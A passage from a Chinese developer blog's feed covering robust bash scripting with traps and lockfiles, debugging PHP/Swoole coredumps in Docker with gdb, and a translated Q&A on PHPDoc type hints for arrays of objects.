class="line">fi</span><br></pre></td></tr></table></figure><p>现在当你杀死进程时，锁文件一同被删除。注意在trap命令中明确地退出了脚本，否则脚本会继续执行trap后面的命令。</p><h1 id="竟态条件-wikipedia"><a href="#竟态条件-wikipedia" class="headerlink" title="竟态条件 (wikipedia)"></a>竟态条件 (<a href="http://zh.wikipedia.org/wiki/%E7%AB%B6%E7%88%AD%E5%8D%B1%E5%AE%B3" target="_blank" rel="noopener">wikipedia</a>)</h1><p>在上面锁文件的例子中，有一个竟态条件是不得不指出的，它存在于判断锁文件和创建锁文件之间。一个可行的解决方法是使用IO重定向和bash的noclobber(<a href="http://en.wikipedia.org/wiki/Clobbering" target="_blank" rel="noopener">wikipedia</a>)模式，重定向到不存在的文件。我们可以这么做：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if ( set -o noclobber; echo "$$" &gt; "$lockfile") 2&gt; /dev/null;</span><br><span class="line"></span><br><span class="line">then</span><br><span class="line"></span><br><span class="line">trap 'rm -f "$lockfile"; exit $?' INT TERM EXIT</span><br><span class="line"></span><br><span class="line">critical-section</span><br><span class="line"></span><br><span class="line">rm -f "$lockfile"</span><br><span class="line"></span><br><span class="line">trap - INT TERM EXIT</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">echo "Failed to acquire lockfile: $lockfile"</span><br><span class="line"></span><br><span class="line">echo "held by $(cat $lockfile)"</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>更复杂一点儿的问题是你要更新一大堆文件，当它们更新过程中出现问题时，你是否能让脚本挂得更加优雅一些。你想确认那些正确更新了，哪些根本没有变化。比如你需要一个添加用户的脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add_to_passwd $user</span><br><span class="line"></span><br><span class="line">cp -a /etc/skel /home/$user</span><br><span class="line"></span><br><span class="line">chown $user /home/$user -R</span><br></pre></td></tr></table></figure><p>当磁盘空间不足或者进程中途被杀死，这个脚本就会出现问题。在这种情况下，你也许希望用户账户不存在，而且他的文件也应该被删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">rollback() &#123;</span><br><span class="line"></span><br><span class="line">del_from_passwd $user</span><br><span class="line"></span><br><span class="line">if [ -e /home/$user ]; then</span><br><span class="line"></span><br><span class="line">rm -rf /home/$user</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">trap rollback INT TERM EXIT</span><br><span class="line"></span><br><span class="line">add_to_passwd $user</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">cp -a /etc/skel /home/$user</span><br><span class="line"></span><br><span class="line">chown $user /home/$user -R</span><br><span class="line"></span><br><span class="line">trap - INT TERM EXIT</span><br></pre></td></tr></table></figure><p>在脚本最后需要使用trap关闭rollback调用，否则当脚本正常退出的时候rollback将会被调用，那么脚本等于什么都没做。</p><h1 id="保持原子化"><a href="#保持原子化" class="headerlink" title="保持原子化"></a>保持原子化</h1><p>又是你需要一次更新目录中的一大堆文件，比如你需要将URL重写到另一个网站的域名。你也许会写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for file in $(find /var/www -type f -name "*.html"); do</span><br><span class="line"></span><br><span class="line">perl -pi -e 's/www.example.net/www.example.com/' $file</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>如果修改到一半是脚本出现问题，一部分使用<a href="http://www.example.com，而另一部分使用www.example.net。你可以使用备份和trap解决，但在升级过程中你的网站URL是不一致的。" target="_blank" rel="noopener">www.example.com，而另一部分使用www.example.net。你可以使用备份和trap解决，但在升级过程中你的网站URL是不一致的。</a></p><p>解决方法是将这个改变做成一个原子操作。先对数据做一个副本，在副本中更新URL，再用副本替换掉现在工作的版本。你需要确认副本和工作版本目录在同一个磁盘分区上，这样你就可以利用Linux系统的优势，它移动目录仅仅是更新目录指向的inode节点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp -a /var/www /var/www-tmp</span><br><span class="line"></span><br><span class="line">for file in $(find /var/www-tmp -type -f -name "*.html"); do</span><br><span class="line"></span><br><span class="line">perl -pi -e 's/www.example.net/www.example.com/' $file</span><br><span class="line"></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">mv /var/www /var/www-old</span><br><span class="line"></span><br><span class="line">mv /var/www-tmp /var/www</span><br></pre></td></tr></table></figure><p>这意味着如果更新过程出问题，线上系统不会受影响。线上系统受影响的时间降低为两次mv操作的时间，这个时间非常短，因为文件系统仅更新inode而不用真正的复制所有的数据。</p><p>这种技术的缺点是你需要两倍的磁盘空间，而且那些长时间打开文件的进程需要比较长的时间才能升级到新文件版本，建议更新完成后重新启动这些进程。对于 apache服务器来说这不是问题，因为它每次都重新打开文件。你可以使用lsof命令查看当前正打开的文件。优势是你有了一个先前的备份，当你需要还原 时，它就派上用场了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;许多人用shell脚本完成一些简单任务，而且变成了他们生命的一部分。不幸的是，shell脚本在运行异常时会受到非常大的影响。在写脚本时将这类问题最小化是十分必要的。本文中我将介绍一些让bash脚本变得健壮的技术。&lt;/p&gt;
&lt;h1 id=&quot;使用set-u&quot;&gt;&lt;a href=&quot;#使用set-u&quot; class=&quot;headerlink&quot; title=&quot;使用set -u&quot;&gt;&lt;/a&gt;使用set -u&lt;/h1&gt;&lt;p&gt;你因为没有对变量初始化而使脚本崩溃过多少次？对于我来说，很多次。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chroot=$1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rm -rf $chroot/usr/share/doc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果上面的代码你没有给参数就运行，你不会仅仅删除掉chroot中的文档，而是将系统的所有文档都删除。那你应该做些什么呢？好在bash提供了&lt;em&gt;set -u&lt;/em&gt;，当你使用未初始化的变量时，让bash自动退出。你也可以使用可读性更强一点的&lt;code&gt;set -o nounset&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;david%&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; bash /tmp/shrink-chroot.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt;chroot=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;david%&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; bash -u /tmp/shrink-chroot.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/tmp/shrink-chroot.sh: line 3: $1: unbound variable&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;david%&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="shell" scheme="http://www.twosee.cn/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>在Docker中处理coredump &amp;&amp; PHP-coredump与gdb使用</title>
    <link href="http://www.twosee.cn/2018/03/04/php-coredump-in-docker/"/>
    <id>http://www.twosee.cn/2018/03/04/php-coredump-in-docker/</id>
    <published>2018-03-04T13:03:01.000Z</published>
    <updated>2018-03-05T07:13:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>前几天在计划写一个爬虫脚本时, 由于涉及到html的浏览器渲染, 干脆用就用浏览器和控制台运行js脚本来作为爬虫工具, chrome支持ES6语法(有些需要在dev设置中开启), 写起来也是十分舒服, 爬完数据并处理过后通过xhr扔给后端服务器即可, 后端是用Swoole负责接收并向数据库进行大文本插入, 不幸的是在这时候错误出现了.</p><p>在数千个请求后nginx代理的后端挂掉了,返回了502BadGateWay,肯定要去上游找原因了,由于swoole是跑在docker容器中的, 于是马上查看容器日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs custed_swoole_1 --tail 100</span><br></pre></td></tr></table></figure><p>可以看到如下报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ WARNINGswProcessPool_wait: worker<span class="comment">#0 abnormal exit, status=0, signal=11</span></span><br></pre></td></tr></table></figure><p>google了一下没找到相关问题, 只能请教rango, 说是signal11是coredump了, 让我抓一下core文件</p><p>然后就开始踩坑了, 我的服务是运行在docker中的, docker里要抓core文件需要一波操作了…</p><p>废话不多说直接总结一下坑</p><h4 id="1-开启容器特权"><a href="#1-开启容器特权" class="headerlink" title="1. 开启容器特权"></a>1. 开启容器特权</h4><p>没有特权模式, 容器里就无法使用gdb调试</p><p>我用的是docker-compose 所以配置里需要加这么一行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果是run的话, 加:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--privileged</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="2-开启coredump文件配置"><a href="#2-开启coredump文件配置" class="headerlink" title="2.开启coredump文件配置"></a>2.开启coredump文件配置</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">-1</span> <span class="comment"># core_dump debug</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="built_in">ulimit</span> core=-1</span><br></pre></td></tr></table></figure><h4 id="3-在容器里安装GDB"><a href="#3-在容器里安装GDB" class="headerlink" title="3. 在容器里安装GDB"></a>3. 在容器里安装GDB</h4><p>重新做镜像是不可能的了, 临时装一个吧(ps: 如果你不想在配置文件里开启core可以在这里临时设置)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">apt-get install -y gdb</span><br></pre></td></tr></table></figure><h4 id="4-触发coredump测试"><a href="#4-触发coredump测试" class="headerlink" title="4. 触发coredump测试"></a>4. 触发coredump测试</h4><p>我们可以用一段c代码死循环来尝试触发一个coredump</p><p>使用<code>g++ -g</code>编译, 加-g选项是为了保证debug信息生成在应用程序当中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">int</span>* p = <span class="literal">NULL</span>;  </span><br><span class="line">  *p = <span class="number">10</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb a.out core</span><br></pre></td></tr></table></figure><h4 id="5-修改core文件命名"><a href="#5-修改core文件命名" class="headerlink" title="5. 修改core文件命名"></a>5. 修改core文件命名</h4><p>坑爹的是, 项目里根目录恰好有个Core文件夹,我的mac硬盘分区给的又是大小写不敏感, GG, 改一波命名..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'core.%e.%p'</span> &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天在计划写一个爬虫脚本时, 由于涉及到html的浏览器渲染, 干脆用就用浏览器和控制台运行js脚本来作为爬虫工具, chrome支持ES6语法(有些需要在dev设置中开启), 写起来也是十分舒服, 爬完数据并处理过后通过xhr扔给后端服务器即可, 后端是用Swoole负责接收并向数据库进行大文本插入, 不幸的是在这时候错误出现了.&lt;/p&gt;
&lt;p&gt;在数千个请求后nginx代理的后端挂掉了,返回了502BadGateWay,肯定要去上游找原因了,由于swoole是跑在docker容器中的, 于是马上查看容器日志&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ docker logs custed_swoole_1 --tail 100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到如下报错&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ WARNING	swProcessPool_wait: worker&lt;span class=&quot;comment&quot;&gt;#0 abnormal exit, status=0, signal=11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;google了一下没找到相关问题, 只能请教rango, 说是signal11是coredump了, 让我抓一下core文件&lt;/p&gt;
&lt;p&gt;然后就开始踩坑了, 我的服务是运行在docker中的, docker里要抓core文件需要一波操作了…&lt;/p&gt;
&lt;p&gt;废话不多说直接总结一下坑&lt;/p&gt;
&lt;h4 id=&quot;1-开启容器特权&quot;&gt;&lt;a href=&quot;#1-开启容器特权&quot; class=&quot;headerlink&quot; title=&quot;1. 开启容器特权&quot;&gt;&lt;/a&gt;1. 开启容器特权&lt;/h4&gt;&lt;p&gt;没有特权模式, 容器里就无法使用gdb调试&lt;/p&gt;
&lt;p&gt;我用的是docker-compose 所以配置里需要加这么一行&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;privileged:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是run的话, 加:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;--privileged&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="coredump" scheme="http://www.twosee.cn/tags/coredump/"/>
    
      <category term="docker" scheme="http://www.twosee.cn/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>[译] PHPDoc类型提示数组的对象</title>
    <link href="http://www.twosee.cn/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/"/>
    <id>http://www.twosee.cn/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/</id>
    <published>2018-01-28T13:28:29.000Z</published>
    <updated>2018-05-12T03:20:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>因此，在PHPDoc中，可以在成员变量声明之上指定<code>@var</code>来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="comment">/** <span class="doctag">@var</span> SomeObj */</span></span><br><span class="line"> <span class="keyword">private</span> $someObjInstance;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。</p><p>那么，有没有办法声明一个PHPDoc标签来指定成员变量是<code>SomeObj</code>的数组？ <code>@var</code>数组是不够的，例如<code>@var array(SomeObj)</code>似乎没有效果。</p><h2 id="最佳解决方案"><a href="#最佳解决方案" class="headerlink" title="最佳解决方案"></a>最佳解决方案</h2><p>在JetBrains的PhpStorm IDE中，您可以使用<code>/** @var SomeObj[] */</code>，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SomeObj[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSomeObjects</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p><a href="https://segmentfault.com/link.php?target=http%3A//phpdoc.org/docs/latest/references/phpdoc/types.html%23arrays">phpdoc documentation</a>推荐这种方法：</p><blockquote><p>specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array.</p><p>Example: <code>@return int[]</code></p></blockquote><a id="more"></a><h2 id="次佳解决方案"><a href="#次佳解决方案" class="headerlink" title="次佳解决方案"></a>次佳解决方案</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($Objs <span class="keyword">as</span> $Obj)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* <span class="doctag">@var</span> $Obj Test */</span></span><br><span class="line"> <span class="comment">// You should be able to get hinting after the preceding line if you type $Obj-&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我在Zend Studio中做了很多工作。不知道其他编辑，但它应该工作。</p><h2 id="第三种解决方案"><a href="#第三种解决方案" class="headerlink" title="第三种解决方案"></a>第三种解决方案</h2><p>Netbeans提示：</p><p>您可以在<code>$users[0]-&gt;</code>和<code>$this-&gt;</code>上获取用户类数组的代码完成。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> User[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $users = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure><p>当您完成<code>$this-&gt;...</code>时，您还可以看到类成员列表中的数组类型</p><h2 id="第四种方案"><a href="#第四种方案" class="headerlink" title="第四种方案"></a>第四种方案</h2><p>指定变量是一个对象数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$needles = getAllNeedles();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $needles Needle[] */</span></span><br><span class="line">$needles[<span class="number">1</span>]-&gt;... <span class="comment">//codehinting works</span></span><br></pre></td></tr></table></figure><p>这在Netbeans 7.2(我正在使用它)</p><p>还有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$needles = getAllNeedles();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $needles Needle[] */</span></span><br><span class="line"><span class="keyword">foreach</span> ($needles <span class="keyword">as</span> $needle) &#123;</span><br><span class="line"> $needle-&gt;... <span class="comment">//codehinting works</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此在<code>foreach</code>中使用声明是不必要的。</p><h2 id="第五种方案"><a href="#第五种方案" class="headerlink" title="第五种方案"></a>第五种方案</h2><p>我更喜欢阅读和编写干净的代码 – 如Robert C. Martin的”Clean Code”所述。当遵循他的信条时，您不应要求开发人员(作为您的API的用户)知道数组的(内部)结构。</p><p>API用户可能会问：这是仅一维的数组吗？物体是否在多维数组的各个层次上传播？我需要访问所有对象有多少个嵌套循环(foreach等)？什么类型的对象是该数组中的”stored”？</p><p>如您所概述的，您希望将该数组(其中包含对象)用作一维数组。</p><p>正如Nishi所概述的，你可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SomeObj[]</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>为了那个原因。</p><p>但再次：请注意 – 这不是一个标准的docblock符号。这种符号是由一些IDE生产者引入的。</p><p>好的，作为一名开发人员，您知道”[]”与PHP中的数组绑定。但是在正常的PHP上下文中”something[]”是什么意思？ “[]”意味着：在”something”中创建新元素。新的元素可以是一切。但是你想表达的是：具有相同类型的对象的数组，它的确切类型。您可以看到，IDE生产者引入了一个新的上下文。你必须学习的一个新的背景。 PHP开发人员必须学习的新环境(了解您的docblocks)。坏风格(！)。</p><p>因为你的数组确实有一个维度，你可能想要将这个“数组的对象”称为”list”。请注意，”list”在其他编程语言中具有非常特殊的意义。它会被更好地称为”collection”为例。</p><p>记住：您使用一种编程语言，可以为您提供OOP的所有选项。使用类而不是数组，并使类像数组一样遍历。例如。：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orderCollection</span> <span class="keyword">implements</span> <span class="title">ArrayIterator</span></span></span><br></pre></td></tr></table></figure><p>或者如果要将内部对象存储在多维数组/对象结构中的不同级别上：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orderCollection</span> <span class="keyword">implements</span> <span class="title">RecursiveArrayIterator</span></span></span><br></pre></td></tr></table></figure><p>此解决方案将使用”orderCollection”类型的对象替换您的数组，但是到目前为止，不能在IDE中启用代码完成。好的。下一步：</p><p>实现与docblock接口引入的方法 – 特别是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::current()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> integer E.g. database identifier of the order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::key()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::offsetGet()</span><br></pre></td></tr></table></figure><p>不要忘记使用类型提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orderCollection::append(Order $order)</span><br><span class="line">orderCollection::offsetSet(Order $order)</span><br></pre></td></tr></table></figure><p>这个解决方案停止引入很多：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@var</span> $key ... */</span></span><br><span class="line"><span class="comment">/** <span class="doctag">@var</span> $value ... 